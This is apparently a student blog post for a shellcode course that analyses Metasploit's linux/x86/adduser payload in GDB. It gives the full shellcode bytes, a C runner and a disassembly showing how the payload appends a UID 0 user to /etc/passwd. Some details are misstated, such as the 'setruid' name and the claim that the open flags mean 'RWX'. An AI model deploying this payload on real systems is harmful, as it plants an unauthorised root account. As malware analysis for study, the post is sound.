<i>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</i><br /><i> </i><i><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></i><br /><i> </i><i><b>Student ID:</b>&nbsp;SLAE-885</i><br /><i><b>Assignment number: </b>5.1</i><br /><i><b>Github repo:</b> <a href="https://github.com/abatchy17/SLAE">https://github.com/abatchy17/SLAE</a>&nbsp; </i><br /><br />Next assignment requires dissecting three linux/x86 MSF payloads using one of the following tools (GDB - ndisasm - libemu). In this post I'll show how the linux/x86/adduser is executed using GDB.<br /><br /><h2>1. Setting shellcode parameters</h2><br />First let's check the options for this module and try executing it.<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #8f5902;">root@kali:~/Desktop/work#</span> <span style="color: #444444;">msfvenom -p linux/x86/adduser --payload-options</span><br /><span style="color: black; font-style: italic;">Options for payload/linux/x86/adduser:</span><br /><br /><br /><span style="color: black; font-style: italic;">       Name: Linux Add User</span><br /><span style="color: black; font-style: italic;">     Module: payload/linux/x86/adduser</span><br /><span style="color: black; font-style: italic;">   Platform: Linux</span><br /><span style="color: black; font-style: italic;">       Arch: x86</span><br /><span style="color: black; font-style: italic;">Needs Admin: Yes</span><br /><span style="color: black; font-style: italic;"> Total size: 97</span><br /><span style="color: black; font-style: italic;">       Rank: Normal</span><br /><br /><span style="color: black; font-style: italic;">Provided by:</span><br /><span style="color: black; font-style: italic;">    skape &lt;mmiller@hick.org&gt;</span><br /><span style="color: black; font-style: italic;">    vlad902 &lt;vlad902@gmail.com&gt;</span><br /><span style="color: black; font-style: italic;">    spoonm &lt;spoonm@no$email.com&gt;</span><br /><br /><span style="color: black; font-style: italic;">Basic options:</span><br /><span style="color: black; font-style: italic;">Name   Current Setting  Required  Description</span><br /><span style="color: black; font-style: italic;">----   ---------------  --------  -----------</span><br /><span style="color: black; font-style: italic;">PASS   metasploit       yes       The password for this user</span><br /><span style="color: black; font-style: italic;">SHELL  /bin/sh          no        The shell for this user</span><br /><span style="color: black; font-style: italic;">USER   metasploit       yes       The username to create</span><br /><br /><span style="color: black; font-style: italic;">Description:</span><br /><span style="color: black; font-style: italic;">  Create a new user with UID 0</span><br /></pre></div><br /><br />I skipped over the advanced settings as they won't be discussed in this post. As for the basic options, there are 3 values we need to set: PASS, SHELL and USER. Executing the payload will create a user with UID 0 using the credentials provided (USER/PASS), using SHELL as default shell.<br /><h2>2. Generating shellcode </h2><!-- HTML generated using hilite.me --><br /><div style="background: #000000; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~/Desktop/SLAE#</span> msfvenom -p linux/x86/adduser <span style="color: #00cdcd;">USER</span><span style="color: #3399cc;">=</span>abatchy <span style="color: #00cdcd;">PASS</span><span style="color: #3399cc;">=</span>killem -f c<br /><span style="color: #888888;">No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br /><span style="color: #888888;">No Arch selected, selecting Arch: x86 from the payload</span><br /><span style="color: #888888;">No encoder or badchars specified, outputting raw payload</span><br /><span style="color: #888888;">Payload size: 94 bytes</span><br /><span style="color: #888888;">Final size of c file: 421 bytes</span><br /><span style="color: #888888;">unsigned char buf[] = </span><br /><span style="color: #888888;">"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"</span><br /><span style="color: #888888;">"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"</span><br /><span style="color: #888888;">"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x25\x00\x00\x00\x61\x62"</span><br /><span style="color: #888888;">"\x61\x74\x63\x68\x79\x3a\x41\x7a\x62\x47\x66\x50\x36\x38\x38"</span><br /><span style="color: #888888;">"\x4e\x74\x61\x2e\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69"</span><br /><span style="color: #888888;">"\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a"</span><br /><span style="color: #888888;">"\x01\x58\xcd\x80";</span><br /></pre></div><br />Next, let's put the shellcode inside a C wrapper.<br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #9999a9;">/*</span><br /><span style="color: #9999a9;">&nbsp;adduserWrapper.c</span><br /><span style="color: #9999a9;">By Abatchy</span><br /><span style="color: #9999a9;">gcc adduserWrapper.c -fno-stack-protector -z execstack -o adduserWrapper.out</span><br /><span style="color: #9999a9;">*/</span><br /><br /><span style="color: #008073;">#</span><span style="color: #008073;">include </span><span style="color: #02d045;">&lt;</span><span style="color: #40015a;">stdio.h</span><span style="color: #02d045;">&gt;</span><br /><span style="color: #008073;">#</span><span style="color: #008073;">include </span><span style="color: #02d045;">&lt;</span><span style="color: #40015a;">string.h</span><span style="color: #02d045;">&gt;</span><br /><br /><span style="color: #e66170; font-weight: bold;">unsigned</span> <span style="color: #e66170; font-weight: bold;">char</span> buf<span style="color: #d2cd86;">[</span><span style="color: #d2cd86;">]</span> <span style="color: #d2cd86;">=</span> <br /><span style="color: #02d045;">"</span><span style="color: teal;">\x31</span><span style="color: teal;">\xc9</span><span style="color: teal;">\x89</span><span style="color: teal;">\xcb</span><span style="color: teal;">\x6a</span><span style="color: teal;">\x46</span><span style="color: teal;">\x58</span><span style="color: teal;">\xcd</span><span style="color: teal;">\x80</span><span style="color: teal;">\x6a</span><span style="color: teal;">\x05</span><span style="color: teal;">\x58</span><span style="color: teal;">\x31</span><span style="color: teal;">\xc9</span><span style="color: teal;">\x51</span><span style="color: #02d045;">"</span><br /><span style="color: #02d045;">"</span><span style="color: teal;">\x68</span><span style="color: teal;">\x73</span><span style="color: teal;">\x73</span><span style="color: teal;">\x77</span><span style="color: teal;">\x64</span><span style="color: teal;">\x68</span><span style="color: teal;">\x2f</span><span style="color: teal;">\x2f</span><span style="color: teal;">\x70</span><span style="color: teal;">\x61</span><span style="color: teal;">\x68</span><span style="color: teal;">\x2f</span><span style="color: teal;">\x65</span><span style="color: teal;">\x74</span><span style="color: teal;">\x63</span><span style="color: #02d045;">"</span><br /><span style="color: #02d045;">"</span><span style="color: teal;">\x89</span><span style="color: teal;">\xe3</span><span style="color: teal;">\x41</span><span style="color: teal;">\xb5</span><span style="color: teal;">\x04</span><span style="color: teal;">\xcd</span><span style="color: teal;">\x80</span><span style="color: teal;">\x93</span><span style="color: teal;">\xe8</span><span style="color: teal;">\x25</span><span style="color: teal;">\x00</span><span style="color: teal;">\x00</span><span style="color: teal;">\x00</span><span style="color: teal;">\x61</span><span style="color: teal;">\x62</span><span style="color: #02d045;">"</span><br /><span style="color: #02d045;">"</span><span style="color: teal;">\x61</span><span style="color: teal;">\x74</span><span style="color: teal;">\x63</span><span style="color: teal;">\x68</span><span style="color: teal;">\x79</span><span style="color: teal;">\x3a</span><span style="color: teal;">\x41</span><span style="color: teal;">\x7a</span><span style="color: teal;">\x62</span><span style="color: teal;">\x47</span><span style="color: teal;">\x66</span><span style="color: teal;">\x50</span><span style="color: teal;">\x36</span><span style="color: teal;">\x38</span><span style="color: teal;">\x38</span><span style="color: #02d045;">"</span><br /><span style="color: #02d045;">"</span><span style="color: teal;">\x4e</span><span style="color: teal;">\x74</span><span style="color: teal;">\x61</span><span style="color: teal;">\x2e</span><span style="color: teal;">\x3a</span><span style="color: teal;">\x30</span><span style="color: teal;">\x3a</span><span style="color: teal;">\x30</span><span style="color: teal;">\x3a</span><span style="color: teal;">\x3a</span><span style="color: teal;">\x2f</span><span style="color: teal;">\x3a</span><span style="color: teal;">\x2f</span><span style="color: teal;">\x62</span><span style="color: teal;">\x69</span><span style="color: #02d045;">"</span><br /><span style="color: #02d045;">"</span><span style="color: teal;">\x6e</span><span style="color: teal;">\x2f</span><span style="color: teal;">\x73</span><span style="color: teal;">\x68</span><span style="color: teal;">\x0a</span><span style="color: teal;">\x59</span><span style="color: teal;">\x8b</span><span style="color: teal;">\x51</span><span style="color: teal;">\xfc</span><span style="color: teal;">\x6a</span><span style="color: teal;">\x04</span><span style="color: teal;">\x58</span><span style="color: teal;">\xcd</span><span style="color: teal;">\x80</span><span style="color: teal;">\x6a</span><span style="color: #02d045;">"</span><br /><span style="color: #02d045;">"</span><span style="color: teal;">\x01</span><span style="color: teal;">\x58</span><span style="color: teal;">\xcd</span><span style="color: teal;">\x80</span><span style="color: #02d045;">"</span><span style="color: #b060b0;">;</span><br /><br /><span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #e66170; font-weight: bold;">main</span><span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span><br /><span style="color: #b060b0;">{</span><br />    <span style="color: #e66170; font-weight: bold;">printf</span><span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">Shellcode size: </span><span style="color: #007997;">%d</span><span style="color: teal;">\n</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">,</span> <span style="color: #e66170; font-weight: bold;">strlen</span><span style="color: #d2cd86;">(</span>buf<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span><br />    <span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">*</span>ret<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span> <span style="color: #d2cd86;">=</span> <span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">int</span><span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">*</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span>buf<span style="color: #b060b0;">;</span><br />    ret<span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span><br /><span style="color: #b060b0;">}</span><br /></pre>Compile, run GDB and break on shellcode.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #8f5902;">root@ubuntu:~/Desktop/workspace#</span> gcc adduserWrapper.c -fno-stack-protector -z execstack -o adduserWrapper.out<br /><span style="color: #8f5902;">root@ubuntu:~/Desktop/workspace#</span> chmod 777 adduserWrapper.out <br /><span style="color: #8f5902;">root@ubuntu:~/Desktop/workspace#</span> gdb -q adduserWrapper.out <br /><span style="color: black; font-style: italic;">Reading symbols from adduserWrapper.out...(no debugging symbols found)...done.</span><br /><span style="color: black; font-style: italic;">(gdb) disass main</span><br /><span style="color: black; font-style: italic;">Dump of assembler code for function main:</span><br /><span style="color: black; font-style: italic;">   0x0804844d &lt;+0&gt;: push   ebp</span><br /><span style="color: black; font-style: italic;">   0x0804844e &lt;+1&gt;: mov    ebp,esp</span><br /><span style="color: black; font-style: italic;">   0x08048450 &lt;+3&gt;: and    esp,0xfffffff0</span><br /><span style="color: black; font-style: italic;">   0x08048453 &lt;+6&gt;: sub    esp,0x20</span><br /><span style="color: black; font-style: italic;">   0x08048456 &lt;+9&gt;: mov    DWORD PTR [esp],0x804a040</span><br /><span style="color: black; font-style: italic;">   0x0804845d &lt;+16&gt;: call   0x8048330 &lt;strlen@plt&gt;</span><br /><span style="color: black; font-style: italic;">   0x08048462 &lt;+21&gt;: mov    DWORD PTR [esp+0x4],eax</span><br /><span style="color: black; font-style: italic;">   0x08048466 &lt;+25&gt;: mov    DWORD PTR [esp],0x8048520</span><br /><span style="color: black; font-style: italic;">   0x0804846d &lt;+32&gt;: call   0x8048310 &lt;printf@plt&gt;</span><br /><span style="color: black; font-style: italic;">   0x08048472 &lt;+37&gt;: mov    DWORD PTR [esp+0x1c],0x804a040</span><br /><span style="color: black; font-style: italic;">   0x0804847a &lt;+45&gt;: mov    eax,DWORD PTR [esp+0x1c]</span><br /><span style="color: black; font-style: italic;">   0x0804847e &lt;+49&gt;: call   eax</span><br /><span style="color: black; font-style: italic;">   0x08048480 &lt;+51&gt;: leave  </span><br /><span style="color: black; font-style: italic;">   0x08048481 &lt;+52&gt;: ret    </span><br /><span style="color: black; font-style: italic;">End of assembler dump.</span><br /><span style="color: black; font-style: italic;">(gdb) break *0x804a040</span><br /><span style="color: black; font-style: italic;">Breakpoint 1 at 0x804a040</span><br /><span style="color: black; font-style: italic;">(gdb) r</span><br /><span style="color: black; font-style: italic;">Starting program: /home/abatchy/Desktop/workspace/adduserWrapper.out </span><br /><span style="color: black; font-style: italic;">Shellcode size: 40</span><br /><br /><span style="color: black; font-style: italic;">Breakpoint 1, 0x0804a040 in sc ()</span><br /></pre></div><br /><b>Shellcode disassembly:</b><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: black; font-style: italic;">Dump of assembler code for function sc:</span><br /><span style="color: black; font-style: italic;">   0x0804a040 &lt;+0&gt;: xor    ecx,ecx</span><br /><span style="color: black; font-style: italic;">   0x0804a042 &lt;+2&gt;: mov    ebx,ecx</span><br /><span style="color: black; font-style: italic;">   0x0804a044 &lt;+4&gt;: push   0x46</span><br /><span style="color: black; font-style: italic;">   0x0804a046 &lt;+6&gt;: pop    eax</span><br /><span style="color: black; font-style: italic;">   0x0804a047 &lt;+7&gt;: int    0x80</span><br /><span style="color: black; font-style: italic;">   0x0804a049 &lt;+9&gt;: push   0x5</span><br /><span style="color: black; font-style: italic;">   0x0804a04b &lt;+11&gt;: pop    eax</span><br /><span style="color: black; font-style: italic;">   0x0804a04c &lt;+12&gt;: xor    ecx,ecx</span><br /><span style="color: black; font-style: italic;">   0x0804a04e &lt;+14&gt;: push   ecx</span><br /><span style="color: black; font-style: italic;">   0x0804a04f &lt;+15&gt;: push   0x64777373</span><br /><span style="color: black; font-style: italic;">   0x0804a054 &lt;+20&gt;: push   0x61702f2f</span><br /><span style="color: black; font-style: italic;">   0x0804a059 &lt;+25&gt;: push   0x6374652f</span><br /><span style="color: black; font-style: italic;">   0x0804a05e &lt;+30&gt;: mov    ebx,esp</span><br /><span style="color: black; font-style: italic;">   0x0804a060 &lt;+32&gt;: inc    ecx</span><br /><span style="color: black; font-style: italic;">   0x0804a061 &lt;+33&gt;: mov    ch,0x4</span><br /><span style="color: black; font-style: italic;">   0x0804a063 &lt;+35&gt;: int    0x80</span><br /><span style="color: black; font-style: italic;">   0x0804a065 &lt;+37&gt;: xchg   ebx,eax</span><br /><span style="color: black; font-style: italic;">   0x0804a066 &lt;+38&gt;: call   0x804a090 &lt;sc+80&gt;</span><br /><span style="color: black; font-style: italic;">   0x0804a06b &lt;+43&gt;: popa   </span><br /><span style="color: black; font-style: italic;">   0x0804a06c &lt;+44&gt;: bound  esp,QWORD PTR [ecx+0x74]</span><br /><span style="color: black; font-style: italic;">   0x0804a06f &lt;+47&gt;: arpl   WORD PTR [eax+0x79],bp</span><br /><span style="color: black; font-style: italic;">   0x0804a072 &lt;+50&gt;: cmp    al,BYTE PTR [ecx+0x7a]</span><br /><span style="color: black; font-style: italic;">   0x0804a075 &lt;+53&gt;: bound  eax,QWORD PTR [edi+0x66]</span><br /><span style="color: black; font-style: italic;">   0x0804a078 &lt;+56&gt;: push   eax</span><br /><span style="color: black; font-style: italic;">   0x0804a079 &lt;+57&gt;: cmp    BYTE PTR ss:[eax],bh</span><br /><span style="color: black; font-style: italic;">   0x0804a07c &lt;+60&gt;: dec    esi</span><br /><span style="color: black; font-style: italic;">   0x0804a07d &lt;+61&gt;: je     0x804a0e0</span><br /><span style="color: black; font-style: italic;">   0x0804a07f &lt;+63&gt;: cmp    dh,BYTE PTR cs:[eax]</span><br /><span style="color: black; font-style: italic;">   0x0804a082 &lt;+66&gt;: cmp    dh,BYTE PTR [eax]</span><br /><span style="color: black; font-style: italic;">   0x0804a084 &lt;+68&gt;: cmp    bh,BYTE PTR [edx]</span><br /><span style="color: black; font-style: italic;">   0x0804a086 &lt;+70&gt;: das    </span><br /><span style="color: black; font-style: italic;">   0x0804a087 &lt;+71&gt;: cmp    ch,BYTE PTR [edi]</span><br /><span style="color: black; font-style: italic;">   0x0804a089 &lt;+73&gt;: bound  ebp,QWORD PTR [ecx+0x6e]</span><br /><span style="color: black; font-style: italic;">   0x0804a08c &lt;+76&gt;: das    </span><br /><span style="color: black; font-style: italic;">   0x0804a08d &lt;+77&gt;: jae    0x804a0f7</span><br /><span style="color: black; font-style: italic;">   0x0804a08f &lt;+79&gt;: or     bl,BYTE PTR [ecx-0x75]</span><br /><span style="color: black; font-style: italic;">   0x0804a092 &lt;+82&gt;: push   ecx</span><br /><span style="color: black; font-style: italic;">   0x0804a093 &lt;+83&gt;: cld    </span><br /><span style="color: black; font-style: italic;">   0x0804a094 &lt;+84&gt;: push   0x4</span><br /><span style="color: black; font-style: italic;">   0x0804a096 &lt;+86&gt;: pop    eax</span><br /><span style="color: black; font-style: italic;">   0x0804a097 &lt;+87&gt;: int    0x80</span><br /><span style="color: black; font-style: italic;">   0x0804a099 &lt;+89&gt;: push   0x1</span><br /><span style="color: black; font-style: italic;">   0x0804a09b &lt;+91&gt;: pop    eax</span><br /><span style="color: black; font-style: italic;">   0x0804a09c &lt;+92&gt;: int    0x80</span><br /><span style="color: black; font-style: italic;">   0x0804a09e &lt;+94&gt;: add    BYTE PTR [eax],al</span><br /><span style="color: black; font-style: italic;">End of assembler dump.</span><br /></pre></div><br />Awesome, now let's analyze these instructions. We'll be doing the following:<br />1. Put break points at interrupts or calls.<br />2. Observe any JMP behaviour.<br />3. Occasionally analyze instructions manually.<br /><br /><h3>2.1. setruid(0,0)</h3><br />Let's set a break point at 0x804a047, command: <b>break *0x804a047</b><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/md2t3rV.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/md2t3rV.png" height="456" width="640" /></a></div><br /><b>Register values:</b><br />EAX = 0x46<br />EBX = 0<br />ECX = 0<br />EDX = Poiner to NULL<br /><b><br /></b> EAX contains 70, which is for syscall setruid(). This function will set the real and effective UID.<br /><br /><b>syscall made: </b>setruid(NULL, NULL)<br /><b>Reference:</b> <a href="http://man7.org/linux/man-pages/man2/setreuid.2.html">http://man7.org/linux/man-pages/man2/setreuid.2.html</a> <br /><b> </b><br />Since both EBX (first argument) and ECX (second argument) are zeroes, <b>setruid(0,0)</b> is executed. This is needed to have permissions to edit <b>/etc/passwd</b>.<br /><br /><h3>2.2 open("/etc/passwd", O_WRONLY|O_APPEND, 0)</h3><br />Next int 0x80 is at <b>0x0804a063</b>, let's break at that.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/VWsv0a2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/VWsv0a2.png" height="502" width="640" /></a></div><br /><b>Register values:</b><br />EAX = 5<br />EBX points to string "/etc/passwd"<br />ECX = 0x401<br />EDX = 0<br /><br />5 is for syscall open(const char * filename, int flags, int mode)<br /><br /><b>syscall made:</b> open("/etc/passwd", O_WRONLY|O_APPEND, 0)<br /><b>Reference: </b><a href="http://man7.org/linux/man-pages/man2/open.2.html">http://man7.org/linux/man-pages/man2/open.2.html </a><br />Flags indicate file permissions are RWX.<br /><br />On return, a file descriptor is stored in EAX for the opened file. It's stored in EBX through the <b>"xchg eax, ebx"</b> command.<br /><br /><h3>2.3 Writing to "/etc/passwd"</h3><br />Next interrupt is at 0x0804a097, this part is brilliant. You'll notice that at 0x0804a066 sc+80 is being called. Reason is that the string to be appended to "/etc/passwd" is between 0x804a06b and 0x804A0A1. Calling sc+80 pushes EIP (after being incremented, which happens to point onto our string) onto the stack. Take a moment to observe that in the screenshot:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/jIxbSRT.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/jIxbSRT.png" height="380" width="640" /></a></div><br />To sum this part up:<br />1.<i>0x0804a066 &lt;+38&gt;: call   0x804a090 &lt;sc+80&gt;</i><br />Call sc+80, EIP is incremented to point at 0x804a06b (beginning of string) and pushed onto stack.<br /><br />2.<i> 0x804a090 &lt;sc+80&gt;:&nbsp;&nbsp; &nbsp;pop&nbsp;&nbsp;&nbsp; ecx</i><br />Store pointer to string in ECX<br /><br />Let's skip to 0x804a097.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/2WUdAMa.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/2WUdAMa.png" height="524" width="640" /></a></div><br /><b>Register values:</b><br />EAX =4<br />EBX = 3<br />ECX points to /etc/passwd entry for abatchy:killem<br />EDX = 0x25<b></b><br /><b><br /></b><br />4 is for <b>write(int </b><i>fd</i><b>, const void *</b><i>buf</i><b>, size_t </b><i>count</i><b>);</b><br /><b>Reference:</b> http://man7.org/linux/man-pages/man2/write.2.html<b> </b><br /><br /><b>syscall made:</b> write(3, "abatchy:AzbGfP688Nta.:0:0::/:/bin/sh" , 37);<br />This will simply append the string to file descriptor 3, which is a reference to the opened file /etc/passwd.<br /><br /><h3>2.4 Exiting</h3><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/b9c4VRD.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/b9c4VRD.png" height="540" width="640" /></a></div><br />Pretty self-explanatory, code exits with status 3.<br /><br /><h3>TL;DR</h3><h3>&nbsp;</h3>1. setreuid(0,0): Ensure real/effective UID is of root.<br />2. open("/etc/passwd, O_WRONLY|O_APPEND, 0): Open file and append to it.<br />3. write(3, "abatchy:AzbGfP688Nta.:0:0::/:/bin/sh" , 37);<br />4. exit(3)<br /><br />- Abatchy 